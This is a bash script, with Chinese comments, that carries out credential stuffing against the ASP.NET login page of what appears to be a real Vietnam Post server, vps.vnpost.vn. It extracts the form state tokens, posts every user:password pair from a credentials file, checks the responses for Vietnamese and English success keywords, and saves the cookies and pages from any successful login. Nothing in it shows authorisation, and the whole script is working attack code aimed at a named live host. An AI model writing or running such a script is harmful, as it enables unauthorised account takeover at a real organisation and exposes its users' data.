#!/bin/bash
URL="http://vps.vnpost.vn/vckv/Login.aspx"

echo "=== 修正后的VCKV测试 ==="

# 获取完整表单数据
curl -sk "$URL" > login_form.html

VIEWSTATE=$(grep -oP '(?<=__VIEWSTATE" value=")[^"]+' login_form.html)
VIEWSTATEGENERATOR=$(grep -oP '(?<=__VIEWSTATEGENERATOR" value=")[^"]+' login_form.html)
EVENTVALIDATION=$(grep -oP '(?<=__EVENTVALIDATION" value=")[^"]+' login_form.html)

echo "表单字段提取完成"

# 测试凭证（使用正确的字段名）
while IFS=: read -r user pass; do
    echo ""
    echo "[*] 测试: $user / $pass"
    
    response=$(curl -sk "$URL" \
        -X POST \
        -L \
        -d "__VIEWSTATE=$VIEWSTATE" \
        -d "__VIEWSTATEGENERATOR=$VIEWSTATEGENERATOR" \
        -d "__EVENTVALIDATION=$EVENTVALIDATION" \
        -d "ctl00\$MainContent\$txtUser=$user" \
        -d "ctl00\$MainContent\$txtPassword=$pass" \
        -d "ctl00\$MainContent\$btnLogin=Đăng nhập" \
        -c /tmp/cookies_$user.txt)
    
    resp_len=$(echo "$response" | wc -c)
    
    # 检查登录成功的多种特征
    if echo "$response" | grep -qi "logout\|đăng xuất\|index.aspx\|welcome\|chào mừng"; then
        echo "✅✅✅ 登录成功！$user:$pass"
        echo "$response" > /tmp/success_$user.html
        cat /tmp/cookies_$user.txt
    elif echo "$response" | grep -qi "sai\|error\|wrong\|invalid\|không đúng"; then
        echo "❌ 密码错误"
    elif [ "$resp_len" -lt 5000 ]; then
        echo "⚠️  异常响应(短): $resp_len 字节"
    else
        echo "⚠️  未知响应: $resp_len 字节"
        echo "$response" | grep -i "title\|h1\|error" | head -5
    fi
done < vckv_creds.txt
